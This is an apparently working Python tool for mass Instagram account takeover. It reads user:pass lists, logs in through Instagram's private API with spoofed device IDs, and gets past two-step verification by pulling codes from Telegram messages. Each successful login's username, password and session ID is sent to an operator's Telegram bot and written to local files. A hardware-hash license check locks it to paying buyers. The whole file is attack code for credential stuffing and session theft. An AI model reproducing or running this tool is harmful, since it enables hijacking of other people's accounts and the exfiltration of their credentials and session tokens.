import json, re, base64, time, secrets, random, requests, uuid
import os
import sys
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
import subprocess
import hashlib
import time
def run(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
        return out.decode().strip()
    except Exception:
        return ""

android_id = run("settings get secure android_id")
serial = run("getprop ro.serialno") or run("getprop ro.boot.serialno") or run("getprop ro.hardware")
brand = run("getprop ro.product.brand")
model = run("getprop ro.product.model")
mac = run("cat /sys/class/net/wlan0/address 2>/dev/null")
values = [v for v in [android_id, serial, brand, model, mac] if v]
concat = "|".join(values)

SALT = "سِرّ_خاص_قوي_غير_مُشارَك"

full = SALT + "|" + concat
h = hashlib.sha256(full.encode()).hexdigest()
hash=['bff1350461f9c29a8500875b1bbd87cdb7b608541fbdb9e04104033e016104ae']
if h in hash:
    print('good  ')
    pass
else :
	while True:
	   print('your code is /', h)
	   print()
	   print('راسل دارك')
	   time.sleep(90)

token3 = input("TOKEN   :")
chid3 = input("ID  :")
def delete_all_session_files():
    """حذف جميع ملفات .session الموجودة"""
    session_files = [f for f in os.listdir() if f.endswith('.session')]
    
    if not session_files:
        print("[*] No session files found to delete.")
        return
    
    print(f"[*] Found {len(session_files)} session file(s):")
    for f in session_files:
        print(f"    - {f}")
    
    confirm = input("[!] Delete all session files? (yes/no): ").strip().lower()
    
    if confirm in ['yes', 'y']:
        deleted = 0
        for f in session_files:
            try:
                os.remove(f)
                print(f"[+] Deleted: {f}")
                deleted += 1
            except Exception as e:
                print(f"[-] Failed to delete {f}: {e}")
        print(f"[+] Total deleted: {deleted} session file(s)")
    else:
        print("[*] Skipped deletion.")
used_message_ids = set()

class InstaGram:
    def __init__(self, user, pas, telegram_clients=None):
        self.user = user
        self.pas = pas
        self.host = random.choice(["i.instagram.com", "b.i.instagram.com"])
        self.bloks_version = "6a3cbff91965fad8f65457930cea7353a2020e5da081014807c72af8ff4e8334"
        self.telegram_clients = telegram_clients or []
        self.current_client_index = 0

    def _headers(self):
        return {
            'User-Agent': "Instagram 429.1.0.44.70 Android (34/14; 440dpi; 1080x2217; vivo; V2158; V2158; mt6893; en_US; 968419250)",
            'x-fb-client-ip': "True",
            'x-fb-server-cluster': "True",
            'accept-language': "en-GB, en-US",
            'priority': "u=3",
            'x-ig-app-id': "567067343352427",
            'x-ig-capabilities': "3brTv10=",
            'x-bloks-version-id': self.bloks_version,
            'x-bloks-is-panorama-enabled': "true"
        }

    def _bk_context(self):
        return json.dumps({
            "bloks_version": self.bloks_version,
            "styles_id": "instagram"
        }, separators=(',', ':'))

    def _device_id(self):
        return f"android-{str(uuid.uuid4().hex)[:16]}"

    def _machine_id(self):
        return str("a" + secrets.token_urlsafe(20))

    def _family_device_id(self):
        return str(uuid.uuid4())

    def _print_result(self, token, sessionid):
        print(f"""
┌─────────────────────────────
│ Target    : {self.user}
│ Password  : {self.pas}
├─────────────────────────────
│ TOKEN App : {token}
│ Sessionid : {sessionid}
├─────────────────────────────
│ By : @eo_xr
└─────────────────────────────
""")
        
        with open("sessions.txt", "a") as f:
            f.write(f"{sessionid}\n")
        
        try:
            message_text = f"""✅ Instagram Login Success
 User: {self.user}
 Pass: {self.pas}
 Session: {sessionid}
"""
            
            url = f"https://api.telegram.org/bot{token3}/sendMessage"
            data = {
                "chat_id": chid3,
                "text": message_text,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data, timeout=10)
            
            if response.status_code == 200:
                print("[✓] Sent to Telegram successfully")
            else:
                print(f"[✗] Failed to send: {response.text}")
                with open("success_log.txt", "a", encoding="utf-8") as f:
                	f.write(f"User: {self.user}\n")
                	f.write(f"Pass: {self.pas}\n")
                	f.write(f"Session: {sessionid}\n")
            print("[✓] Saved locally in success_log.txt")
                
        except Exception as e:
            print(f"[✗] Telegram error: {e}")
            print("[✓] Saved locally in success_log.txt")
            with open("success_log.txt", "a", encoding="utf-8") as f:
                f.write(f"User: {self.user}\n")
                f.write(f"Pass: {self.pas}\n")
                f.write(f"Session: {sessionid}\n")
            
        

    def _extract_session(self, response):
        m = re.search(r'IG-Set-Authorization.*?IGT:\d+:([A-Za-z0-9+/=_-]+)', response)
        if m:
            token = m.group(1)
            decoded = base64.b64decode(token + '=' * (4 - len(token) % 4)).decode()
            s = re.search(r'"sessionid":"([^"]+)"', decoded).group(1)
            return token, s
        return None, None

    def _sleep(self, seconds, message):
        print(f"[*] {message}")
        time.sleep(seconds)

    def _get_code_from_telegram(self, email, timeout=10):
        global used_message_ids
        
        if not self.telegram_clients:
            print("[-] No Telegram clients available")
            return None
        
        print(f"[*] Looking for username: {self.user}")
        print(f"[*] Number of Telegram sessions: {len(self.telegram_clients)}")
        print("[*] Waiting for Instagram code...")
        
        for client_idx, client in enumerate(self.telegram_clients):
            print(f"\n[*] Trying Telegram session {client_idx + 1}/{len(self.telegram_clients)}")
            
            checked_ids = set()
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                try:
                    msgs = client.get_messages('@fakemailbot', limit=20)
                    
                    for msg in msgs:
                        msg_id = msg.id
                        
                        if msg_id in used_message_ids:
                            continue
                        
                        if msg_id in checked_ids:
                            continue
                        
                        if msg.out:
                            checked_ids.add(msg_id)
                            continue
                        
                        text = msg.text or ""
                        checked_ids.add(msg_id)
                        
                   
                        if self.user in text:
                            print(f"[*] Found username: {self.user} in message")
                            print(f"[*] Message text: {text[:200]}...")
                            
                           
                            code_match = re.search(r'\b(\d{6})\b', text)
                            if code_match:
                                code = code_match.group(1)
                                used_message_ids.add(msg_id)
                                print(f"[+] Found NEW code for {self.user}: {code} (from session {client_idx + 1})")
                                return code
                            
                            
                            patterns = [
                                r'code[:\s]+(\d{6})',
                                r'verification[:\s]+(\d{6})',
                                r'(\d{6})\s+is your',
                                r'your code[:\s]+(\d{6})',
                                r'🔑\s*code[:\s]*(\d{6})',
                                r'code\s*[:\-]\s*(\d{6})',
                            ]
                            for pattern in patterns:
                                match = re.search(pattern, text, re.IGNORECASE)
                                if match:
                                    code = match.group(1)
                                    used_message_ids.add(msg_id)
                                    print(f"[+] Found NEW code for {self.user}: {code} (from session {client_idx + 1})")
                                    return code
                            
                          
                            print(f"[-] Username found but no code in message")
                            return None
                    
                    elapsed = int(time.time() - start_time)
                    if elapsed % 5 == 0 and elapsed > 0:
                        print(f"[*] Session {client_idx + 1}: Waiting... {elapsed}s elapsed")
                    
                    time.sleep(2)
                    
                except Exception as e:
                    print(f"[-] Error checking messages on session {client_idx + 1}: {e}")
                    time.sleep(2)
            
            print(f"[-] Session {client_idx + 1} timeout - No message with username: {self.user}")
        
        print(f"[-] No message found for username: {self.user}")
        return None

    def login(self):
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        email = f"{random_str}@hi2.in"
        
        payload = {
            'params': json.dumps({
                "server_params": {
                    "device_id": self._device_id(),
                    "server_login_source": "login",
                    "waterfall_id": str(uuid.uuid4()),
                    "machine_id": self._machine_id(),
                    "from_native_screen": True,
                    "credential_type": "password",
                    "password": f"#PWD_INSTAGRAM:0:{str(int(time.time()))}:{self.pas}",
                    "try_num": "12",
                    "family_device_id": self._family_device_id(),
                    "event_flow": "login_manual",
                    "event_step": "home_page",
                    "is_from_logged_in_switcher": False,
                    "contact_point": self.user,
                    "email": email  
                }
            }, separators=(',', ':')),
            'bk_client_context': self._bk_context(),
            'bloks_versioning_id': self.bloks_version
        }

        print(f"[*] Sending login request for {self.user}...")
        
        response = requests.post(
            f"https://{self.host}/api/v1/bloks/async_action/com.bloks.www.bloks.caa.login.async.send_login_request/",
            data=payload,
            headers=self._headers()
        ).text.replace("/", "").replace("\\", "")

        token, sessionid = self._extract_session(response)

        if token:
            self._print_result(token, sessionid)
            return True

        elif "two_step_verification" in response:
            return self._handle_2fa(response, email)

        else:
            print("[-] Username or password miss Match")
            return False

    def _handle_2fa(self, response, email):
        self._sleep(3, "Waiting 3 seconds before 2FA entrypoint...")

    
        contx_match = re.search(r'"([^"]+)\|aplc"', response)
        if not contx_match:
            print("[-] This account requires email verification or is locked")
            print("[-] Skipping this account...")
            return False
        
        contx = contx_match.group(1) + "|aplc"

        device_id = self._device_id()
        family_device_id = self._family_device_id()
        machine_id = self._machine_id()

        payload2 = {
            'params': json.dumps({
                "client_input_params": {
                    "auth_secure_device_id": "",
                    "accounts_list": [],
                    "has_whatsapp_installed": 0,
                    "family_device_id": family_device_id,
                    "machine_id": machine_id
                },
                "server_params": {
                    "use_open_instead_of_push": 0,
                    "context_data": contx,
                    "INTERNAL__latency_qpl_marker_id": 36707139,
                    "INTERNAL__latency_qpl_instance_id": 1.84762981400001e14,
                    "device_id": device_id,
                    "use_close_instead_of_back": 0
                }
            }, separators=(',', ':')),
            'bk_client_context': self._bk_context(),
            'bloks_versioning_id': self.bloks_version
        }

        print("[*] Sending 2FA entrypoint request...")
        response2 = requests.post(
            f"https://{self.host}/api/v1/bloks/async_action/com.bloks.www.ap.two_step_verification.entrypoint_async/",
            data=payload2,
            headers=self._headers()
        ).text.replace("/", "").replace("\\", "")

        if "two_step_verification" in response2:
            self._sleep(3, "Waiting 3 seconds before code entry screen...")

            contx2_match = re.search(
                r'com\.bloks\.www\.ap\.two_step_verification\.code_entry.*?"([^"]+\|aplc)"',
                response2,
                re.DOTALL
            )

            if not contx2_match:
                print("[-] Username or password miss Match")
                return False

            contx2 = contx2_match.group(1)

            payload3 = {
                'params': json.dumps({
                    "server_params": {
                        "context_data": contx2,
                        "show_close_button": 0,
                        "device_id": device_id,
                        "INTERNAL_INFRA_screen_id": "generic_code_entry"
                    }
                }, separators=(',', ':')),
                'bk_client_context': self._bk_context(),
                'bloks_versioning_id': self.bloks_version
            }

            print("[*] Loading code entry screen...")
            response3 = requests.post(
                f"https://{self.host}/api/v1/bloks/apps/com.bloks.www.ap.two_step_verification.code_entry/",
                data=payload3,
                headers=self._headers()
            ).text.replace("/", "").replace("\\", "")

            if "two_step_verification" in response3:
                self._sleep(3, "Waiting 3 seconds before requesting verification code...")

            contx4_match = re.search(
                r'com\.bloks\.www\.ap\.two_step_verification\.code_entry_async.*?"([^"]+\|aplc)"',
                response3,
                re.DOTALL
            )

            if not contx4_match:
                print("[-] Username or password miss Match")
                return False

            contx4 = contx4_match.group(1)
            
            print("[*] Getting verification code from Telegram...")
            print(f"[*] Looking for username: {self.user}")
            
            code = self._get_code_from_telegram(email, timeout=10)
            
            if not code:
            	print("[-] Could not get code automatically from Telegram")
            	print("")
            	if not code:
            		print("[-] No code provided, skipping")
            		return False
            
            print(f"[*] Using code: {code}")

            payload4 = {
                'params': json.dumps({
                    "client_input_params": {
                        "auth_secure_device_id": "",
                        "code": code,
                        "family_device_id": family_device_id,
                        "device_id": device_id,
                        "machine_id": machine_id
                    },
                    "server_params": {
                        "context_data": contx4,
                        "INTERNAL__latency_qpl_marker_id": 36707139,
                        "INTERNAL__latency_qpl_instance_id": 1.847912435E14,
                        "device_id": device_id
                    }
                }, separators=(',', ':')),
                'bk_client_context': self._bk_context(),
                'bloks_versioning_id': self.bloks_version
            }

            print("[*] Verifying the entered code...")
            response4 = requests.post(
                f"https://{self.host}/api/v1/bloks/async_action/com.bloks.www.ap.two_step_verification.code_entry_async/",
                data=payload4,
                headers=self._headers()
            ).text.replace("/", "").replace("\\", "")

            token, sessionid = self._extract_session(response4)

            if token:
                self._print_result(token, sessionid)
                return True
            else:
                print("[-] Code Is Error Try Again")
                return False

        else:
            print("[-] Username or password miss Match")
            return False


def setup_multiple_telegram_sessions(num_sessions):
    print("\n")
    print("TELEGRAM SESSION")
    print("="*50)
    
    try:
        with open("apiid.txt", "r") as f:
            api_id = int(f.read().strip())
        print("[+] API ID loaded from file")
    except:
        api_id = int(input("Enter API ID: ").strip())
        with open("apiid.txt", "w") as f:
            f.write(str(api_id))
        print("[+] API ID saved to apiid.txt")
    
    try:
        with open("apihash.txt", "r") as f:
            api_hash = f.read().strip()
        print("[+] API HASH loaded from file")
    except:
        api_hash = input("Enter API HASH: ").strip()
        with open("apihash.txt", "w") as f:
            f.write(api_hash)
        print("[+] API HASH saved to apihash.txt")
    
    clients = []
    
    for i in range(num_sessions):
        print(f"\n[+] Setting up Telegram session {i+1}/{num_sessions}")
        
        if i == 0:
            session_name = "session"
        else:
            session_name = f"session{i}"
        
        session_file = f"{session_name}.session"
        
        print(f"[*] Session file: {session_file}")
        
        client = TelegramClient(session_name, api_id, api_hash)
        
        if not os.path.exists(session_file):
            print(f"[!] No session file found for session {i+1}")
            print(f"[!] Please login to create session {i+1}")
            
            phone = input(f"Enter phone number for session {i+1} (with country code): ").strip()
            client.start(phone=phone)
            print(f"[+] Session {i+1} created and saved!")
        else:
            try:
                client.start()
                print(f"[+] Session {i+1} loaded successfully!")
            except Exception as e:
                print(f"[-] Failed to load session {i+1}: {e}")
                print(f"[!] Please re-login for session {i+1}")
                
                phone = input(f"Enter phone number for session {i+1} (with country code): ").strip()
                client.start(phone=phone)
                print(f"[+] Session {i+1} re-created and saved!")
        
        clients.append(client)
        print(f"[+] Telegram session {i+1} connected!")
    
    print("\n" + "="*50)
    print(f"[+] Successfully set up {len(clients)} Telegram sessions")
    print("="*50)
    
    return clients


def read_accounts_from_file(filepath):
    accounts = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        accounts.append((parts[0].strip(), parts[1].strip()))
        print(f"[+] Loaded {len(accounts)} accounts from {filepath}")
        return accounts
    except FileNotFoundError:
        print(f"[-] File not found: {filepath}")
        return []
    except Exception as e:
        print(f"[-] Error reading file: {e}")
        return []


def main():
    global used_message_ids
    used_message_ids = set()
    delete_all_session_files()
    print("INSTAGRAM LOGIN WITH 2FA AUTO CODE")
    print("="*50)
    
    try:
        num_sessions = int(input("\nNumber of Telegram sessions to use (e.g., 4): ").strip() or "4")
    except:
        num_sessions = 4
        print("[*] Using default: 4 sessions")
    
    if num_sessions < 1:
        num_sessions = 1
    
    telegram_clients = setup_multiple_telegram_sessions(num_sessions)
    
    file_path = input("\nEnter path to accounts.txt file (user:pass): ").strip()
    file_path = file_path.strip('"').strip("'")
    
    accounts = read_accounts_from_file(file_path)
    
    if not accounts:
        print("[-] No accounts found. Exiting...")
        return
    
    print(f"\n[+] Total accounts to process: {len(accounts)}")
    print(f"[+] Telegram sessions available: {len(telegram_clients)}")
    
    confirm = input("\nDo you want to start? (yes/no): ").strip().lower()
    if confirm not in ['yes', 'y']:
        print("[-] Cancelled.")
        return
    
    success_count = 0
    fail_count = 0
    
    for i, (username, password) in enumerate(accounts, 1):
        print(f"\n{'='*50}")
        print(f"[{i}/{len(accounts)}] Processing: {username}")
        print(f"{'='*50}")
        
        instagram = InstaGram(username, password, telegram_clients)
        
        if instagram.login():
            success_count += 1
            print(f"[+] Successfully logged in: {username}")
        else:
            fail_count += 1
            print(f"[-] Failed to login: {username}")
        
        if i < len(accounts):
            delay = random.randint(5, 10)
            print(f"[*] Waiting {delay} seconds before next account...")
            time.sleep(delay)
    
    print("\n" + "="*50)
    print("PROCESSING COMPLETED")
    print(f"[+] Successful logins: {success_count}")
    print(f"[-] Failed logins: {fail_count}")
    print("="*50)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user. Exiting...")
        sys.exit(0)
